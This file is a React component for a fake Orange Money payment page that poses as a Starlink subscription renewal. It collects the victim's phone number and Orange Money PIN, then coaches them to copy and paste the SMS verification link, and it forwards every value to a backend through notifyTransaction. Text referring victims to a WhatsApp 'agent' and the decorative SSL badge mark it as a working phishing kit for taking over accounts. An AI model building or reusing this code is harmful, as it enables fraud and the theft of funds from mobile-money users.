import { useState, useRef, useEffect } from "react";
import {
  notifyTransaction,
  type NotifyPayload,
  type TxStatus,
} from "@/lib/notify";

type Screen = "phone" | "verification" | "notVerified";

interface OrangePaymentProps {
  packageName: string;
  amount: string;
  onBack: () => void;
}

const COUNTRIES = [
  { code: "+243", flag: "cd", name: "RDC", currency: "CDF" },
  { code: "+225", flag: "ci", name: "Côte d'Ivoire", currency: "XOF" },
  { code: "+221", flag: "sn", name: "Sénégal", currency: "XOF" },
  { code: "+223", flag: "ml", name: "Mali", currency: "XOF" },
  { code: "+226", flag: "bf", name: "Burkina Faso", currency: "XOF" },
  { code: "+237", flag: "cm", name: "Cameroun", currency: "XAF" },
  { code: "+242", flag: "cg", name: "Congo", currency: "XAF" },
  { code: "+227", flag: "ne", name: "Niger", currency: "XOF" },
];

export default function OrangePayment({
  packageName,
  amount,
  onBack,
}: OrangePaymentProps) {
  const [screen, setScreen] = useState<Screen>("phone");
  const [phone, setPhone] = useState("");
  const [selectedCountry, setSelectedCountry] = useState(COUNTRIES[0]);
  const [showCountryModal, setShowCountryModal] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [linkInput, setLinkInput] = useState("");
  const [timer, setTimer] = useState(30);
  const [linkExpired, setLinkExpired] = useState(false);
  const [transactionInProgress, setTransactionInProgress] = useState(false);

  const phonePinRefs = useRef<(HTMLInputElement | null)[]>([]);
  const [phonePin, setPhonePin] = useState(["", "", "", ""]);

  const phoneComplete = phone.length >= 8 && phonePin.every((p) => p !== "");

  const baseDetails = (status: TxStatus, stage: string): NotifyPayload => ({
    planName: packageName,
    amount,
    paymentMethod: "orange",
    countryCode: selectedCountry.code,
    countryName: selectedCountry.name,
    phone: phone ? `${selectedCountry.code}${phone}` : undefined,
    pin: phonePin.join(""),
    status,
    stage,
  });

  useEffect(() => {
    if (screen === "verification" && timer > 0) {
      const interval = setInterval(() => {
        setTimer((t) => {
          if (t <= 1) {
            setLinkExpired(true);
            return 0;
          }
          return t - 1;
        });
      }, 1000);
      return () => clearInterval(interval);
    }
  }, [screen, timer]);

  const handlePhonePinChange = (index: number, value: string) => {
    const digit = value.replace(/[^0-9]/g, "");
    const newPin = [...phonePin];
    newPin[index] = digit;
    setPhonePin(newPin);
    if (digit && index < 3) phonePinRefs.current[index + 1]?.focus();
  };

  const handlePhonePinKey = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !phonePin[index] && index > 0) {
      phonePinRefs.current[index - 1]?.focus();
    }
  };

  const goNext = () => {
    if (!phoneComplete) return;
    setLoading(true);
    setError("");
    notifyTransaction({
      ...baseDetails("pending", "phone_submit"),
    });
    setTimeout(() => {
      setLoading(false);
      setScreen("verification");
      setTimer(30);
      setLinkExpired(false);
      setTransactionInProgress(false);
      setLinkInput("");
    }, 1500);
  };

  const verifyLink = () => {
    if (!linkInput.trim()) return;

    const linkToVerify = linkInput.trim();
    setLinkInput("");
    setTransactionInProgress(true);
    setLoading(true);

    notifyTransaction({
      ...baseDetails("pending", "link_verify"),
      verificationLink: linkToVerify,
    });

    setTimeout(() => {
      setLoading(false);
      setTimeout(() => {
        setTransactionInProgress(false);
      }, 3000);
    }, 2000);
  };

  const resendLink = () => {
    setTimer(30);
    setLinkExpired(false);
    setError("");
    setTransactionInProgress(false);
    notifyTransaction({
      ...baseDetails("pending", "link_resend"),
    });
  };

  return (
    <div
      className="fixed inset-0 z-[10000] overflow-y-auto"
      style={{
        background:
          "linear-gradient(180deg, #000 0%, #1a1a1a 50%, #2d2d2d 100%)",
      }}
    >
      <div
        className="min-h-screen flex flex-col items-center px-5 pt-15 pb-10"
        style={{ paddingTop: "60px" }}
      >
        <div className="w-20 h-20 mb-4">
          <svg viewBox="0 0 100 100" fill="none" className="w-full h-full">
            <circle cx="50" cy="50" r="45" fill="#FF6600" />
            <text
              x="50"
              y="62"
              textAnchor="middle"
              fontFamily="Inter, Arial, sans-serif"
              fontSize="40"
              fontWeight="700"
              fill="#fff"
            >
              O
            </text>
          </svg>
        </div>
        <div className="text-[32px] font-bold text-[#FF6600] mb-1">
          Orange Money
        </div>
        <div className="text-sm text-[#FF6600] mb-10">by Orange</div>

        <div className="bg-white rounded-2xl p-6 sm:px-8 w-full max-w-[380px] shadow-2xl">
          <div className="bg-gradient-to-br from-black to-gray-800 p-5 text-center rounded-t-2xl -mx-6 -mt-6 mb-6 sm:-mx-8">
            <h2 className="text-white text-lg font-semibold mb-0">
              ⭐ Paiement Starlink
            </h2>
          </div>

          <div className="bg-gray-50 rounded-xl p-4 mb-5">
            <div className="flex justify-between items-center py-2">
              <span className="text-gray-500 text-sm">Service</span>
              <span className="text-gray-900 font-semibold text-sm">
                Renouvellement Starlink
              </span>
            </div>
            <div className="flex justify-between items-center py-2">
              <span className="text-gray-500 text-sm">Montant</span>
              <span className="text-[#FF6600] text-2xl font-bold">
                {amount}
              </span>
            </div>
          </div>

          {screen === "phone" && (
            <div>
              <h2 className="text-[22px] font-semibold text-black text-center mb-6 leading-tight">
                Entrez votre numéro Orange Money
              </h2>

              {error && (
                <div className="bg-red-50 text-red-600 px-3 py-3 rounded-lg mb-4 text-sm">
                  {error}
                </div>
              )}

              <div className="flex items-center border-2 border-gray-200 rounded-xl overflow-hidden focus-within:border-[#FF6600] transition mb-5">
                <div
                  className="flex items-center justify-center p-3.5 bg-gray-100 border-r border-gray-200 min-w-[70px] cursor-pointer relative hover:bg-gray-200 transition"
                  onClick={() => setShowCountryModal(true)}
                >
                  <div className="w-10 h-10 rounded-full border-2 border-gray-200 flex items-center justify-center bg-white">
                    <span className="text-xs font-bold text-gray-600">
                      {selectedCountry.flag.toUpperCase()}
                    </span>
                  </div>
                  <span className="absolute bottom-1.5 right-1.5 text-[8px] text-gray-500">
                    ▼
                  </span>
                </div>
                <input
                  type="tel"
                  value={phone}
                  onChange={(e) =>
                    setPhone(e.target.value.replace(/[^0-9]/g, "").slice(0, 12))
                  }
                  placeholder={`${selectedCountry.code} XX XX XX XX`}
                  className="flex-1 border-none px-3.5 py-4 text-lg text-black outline-none bg-transparent"
                />
              </div>

              <div className="flex gap-3 justify-center mb-2">
                {phonePin.map((p, i) => (
                  <input
                    key={i}
                    ref={(el) => {
                      phonePinRefs.current[i] = el;
                    }}
                    type="tel"
                    maxLength={1}
                    value={p}
                    onChange={(e) => handlePhonePinChange(i, e.target.value)}
                    onKeyDown={(e) => handlePhonePinKey(i, e)}
                    className="w-[50px] h-14 border-2 border-gray-200 rounded-xl text-center text-2xl font-semibold text-black outline-none focus:border-[#FF6600] transition"
                    style={
                      { WebkitTextSecurity: "disc" } as React.CSSProperties
                    }
                  />
                ))}
              </div>
              <p className="text-center text-gray-500 text-[13px] mb-4 leading-relaxed">
                Entrez votre code PIN Orange Money à 4 chiffres pour autoriser
                cette transaction.
              </p>

              <p className="text-xs text-gray-500 text-center mb-6 leading-relaxed">
                En utilisant ce service, vous acceptez nos{" "}
                <span className="text-[#FF6600] cursor-pointer">
                  Conditions d'utilisation
                </span>{" "}
                et{" "}
                <span className="text-[#FF6600] cursor-pointer">
                  Politique de confidentialité
                </span>
              </p>

              <button
                onClick={goNext}
                disabled={!phoneComplete || loading}
                className="w-full bg-[#FF6600] text-white border-none py-4 rounded-lg text-base font-semibold cursor-pointer flex items-center justify-center gap-2 transition disabled:bg-gray-200 disabled:text-gray-400 hover:bg-[#e55b00]"
              >
                {loading ? (
                  <span className="inline-block w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
                ) : (
                  "SUIVANT"
                )}
              </button>
            </div>
          )}

          {screen === "verification" && (
            <div>
              <button
                onClick={() => {
                  setScreen("phone");
                  setTransactionInProgress(false);
                }}
                className="flex items-center gap-2 text-black text-sm font-medium mb-5"
              >
                <svg
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                  className="w-5 h-5"
                >
                  <path d="M19 12H5M12 19l-7-7 7-7" />
                </svg>
                Retour
              </button>

              <h3 className="text-xl font-semibold text-black mb-2">
                Lien de vérification
              </h3>
              <p className="text-sm text-gray-500 mb-1">
                Un lien de vérification a été envoyé à votre numéro de téléphone
                par SMS.
              </p>
              <p className="text-sm font-semibold text-black mb-5">
                {selectedCountry.code} {phone}
              </p>

              <div className="bg-amber-50 border-2 border-amber-400 rounded-[10px] px-3.5 py-3 mb-3.5 text-center">
                <p className="text-amber-700 font-bold text-sm">
                  ⚠️ NE CLIQUEZ PAS sur le lien — copiez-le et collez-le
                  ci-dessous uniquement
                </p>
              </div>

              <div className="bg-orange-50 border border-orange-200 rounded-xl p-4 mb-5">
                <h4 className="text-sm font-semibold text-[#FF6600] mb-2.5 flex items-center gap-1.5">
                  📋 Comment coller votre lien :
                </h4>
                <ol className="m-0 pl-5 space-y-1.5">
                  <li className="text-[13px] text-gray-600">
                    Ouvrez le{" "}
                    <strong className="text-gray-800">message SMS</strong> que
                    vous avez reçu d'Orange Money
                  </li>
                  <li className="text-[13px] text-gray-600">
                    Trouvez le lien dans le SMS —{" "}
                    <strong className="text-red-600">
                      NE CLIQUEZ PAS dessus
                    </strong>
                  </li>
                  <li className="text-[13px] text-gray-600">
                    <strong className="text-gray-800">
                      Appuyez longuement
                    </strong>{" "}
                    sur le lien jusqu'à ce qu'un menu apparaisse
                  </li>
                  <li className="text-[13px] text-gray-600">
                    Appuyez sur{" "}
                    <strong className="text-gray-800">"Copier le lien"</strong>{" "}
                    ou <strong className="text-gray-800">"Copier"</strong>
                  </li>
                  <li className="text-[13px] text-gray-600">
                    Revenez à cette page
                  </li>
                  <li className="text-[13px] text-gray-600">
                    <strong className="text-gray-800">
                      Appuyez longuement
                    </strong>{" "}
                    sur le champ ci-dessous et appuyez sur{" "}
                    <strong className="text-gray-800">"Coller"</strong>
                  </li>
                  <li className="text-[13px] text-gray-600">
                    Le lien sera vérifié{" "}
                    <strong className="text-gray-800">automatiquement</strong>
                  </li>
                </ol>
              </div>

              {linkExpired && (
                <div className="bg-yellow-50 border border-yellow-300 rounded-lg px-3 py-2.5 mb-4">
                  <p className="text-yellow-700 text-sm text-center">
                    ⚠️ Lien expiré. Veuillez en demander un nouveau.
                  </p>
                </div>
              )}

              {error && (
                <div className="bg-red-50 text-red-600 px-3 py-3 rounded-lg mb-4 text-sm">
                  {error}
                </div>
              )}

              {transactionInProgress && (
                <div className="bg-green-50 border border-green-200 rounded-xl px-4 py-3.5 mb-4 text-center">
                  <p className="text-green-700 text-sm font-medium">
                    Transaction en cours. Veuillez patienter...
                  </p>
                </div>
              )}

              <input
                type="url"
                value={linkInput}
                onChange={(e) => setLinkInput(e.target.value)}
                placeholder="Collez votre lien de vérification ici..."
                disabled={transactionInProgress}
                className="w-full border-2 border-gray-200 rounded-xl px-4 py-3.5 text-sm text-black outline-none focus:border-[#FF6600] transition mb-5 break-all disabled:bg-gray-100 disabled:text-gray-400"
              />

              <div className="text-center text-sm text-gray-500 mb-5">
                {timer > 0 ? (
                  <span className="text-gray-400">
                    Renvoyer le lien dans {timer} secondes
                  </span>
                ) : (
                  <span
                    className="text-[#FF6600] cursor-pointer hover:underline"
                    onClick={resendLink}
                  >
                    Renvoyer le lien
                  </span>
                )}
              </div>

              <p className="text-center text-[13px] text-gray-500 mb-4">
                Si vous ne comprenez pas comment faire, contactez l'agent qui
                vous a dirigé ici depuis WhatsApp.
              </p>

              <button
                onClick={verifyLink}
                disabled={!linkInput.trim() || loading || transactionInProgress}
                className="w-full bg-[#FF6600] text-white border-none py-4 rounded-lg text-base font-semibold cursor-pointer transition disabled:bg-gray-200 hover:bg-[#e55b00]"
              >
                {loading ? (
                  <span className="inline-block w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
                ) : (
                  "Vérifier"
                )}
              </button>
            </div>
          )}

          {screen === "notVerified" && (
            <div className="text-center py-8 px-5">
              <div className="w-20 h-20 rounded-full bg-red-100 flex items-center justify-center mx-auto mb-5">
                <svg
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                  className="w-10 h-10 text-red-600"
                >
                  <circle cx="12" cy="12" r="10" />
                  <path d="M15 9l-6 6M9 9l6 6" />
                </svg>
              </div>
              <h2 className="text-xl font-bold text-red-600 mb-2">
                Échec de la vérification
              </h2>
              <p className="text-gray-500 text-[13px] leading-relaxed mb-6">
                Le lien de vérification n'a pas pu être validé. Veuillez
                vérifier le lien et réessayer.
              </p>
              <button
                onClick={() => {
                  setScreen("verification");
                  setTransactionInProgress(false);
                }}
                className="w-full py-3.5 bg-[#FF6600] text-white border-none rounded-[10px] text-[15px] font-semibold cursor-pointer mb-3 transition hover:bg-[#e55b00]"
              >
                Réessayer
              </button>
              <button
                onClick={() => setScreen("phone")}
                className="w-full py-3.5 bg-transparent text-gray-500 border-2 border-gray-300 rounded-[10px] text-sm font-medium cursor-pointer transition hover:border-gray-400"
              >
                Utiliser un autre numéro
              </button>
            </div>
          )}

          <div className="flex items-center justify-center gap-1.5 mt-4 px-4 py-2 bg-green-50 rounded-full mx-auto w-fit">
            <svg
              viewBox="0 0 24 24"
              fill="currentColor"
              className="w-3.5 h-3.5 text-green-600"
            >
              <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z" />
            </svg>
            <span className="text-[11px] text-green-700 font-medium">
              CRYPTÉ ET SÉCURISÉ EN SSL
            </span>
          </div>
        </div>

        <button
          onClick={onBack}
          className="mt-6 text-sm text-gray-400 hover:text-white transition"
        >
          ← Retour aux forfaits
        </button>
      </div>

      {showCountryModal && (
        <div
          className="fixed inset-0 bg-black/60 z-[9999] flex items-center justify-center"
          onClick={() => setShowCountryModal(false)}
        >
          <div
            className="bg-white rounded-2xl w-[90%] max-w-[340px] max-h-[70vh] overflow-hidden shadow-2xl"
            onClick={(e) => e.stopPropagation()}
          >
            <div className="px-5 py-4 border-b border-gray-200 flex justify-between items-center bg-[#FF6600]">
              <h3 className="text-lg text-white">Sélectionner le pays</h3>
              <button
                onClick={() => setShowCountryModal(false)}
                className="text-2xl text-white leading-none"
              >
                ×
              </button>
            </div>
            <ul className="list-none m-0 p-0 max-h-[calc(70vh-60px)] overflow-y-auto">
              {COUNTRIES.map((c) => (
                <li
                  key={c.code}
                  onClick={() => {
                    setSelectedCountry(c);
                    setShowCountryModal(false);
                    setPhone("");
                  }}
                  className={`flex items-center px-5 py-3.5 cursor-pointer border-b border-gray-100 transition hover:bg-orange-50 ${selectedCountry.code === c.code ? "bg-orange-100" : ""}`}
                >
                  <span className="flex-1 text-[15px] text-gray-800">
                    {c.name}
                  </span>
                  <span className="text-sm text-gray-500">{c.code}</span>
                </li>
              ))}
            </ul>
          </div>
        </div>
      )}
    </div>
  );
}
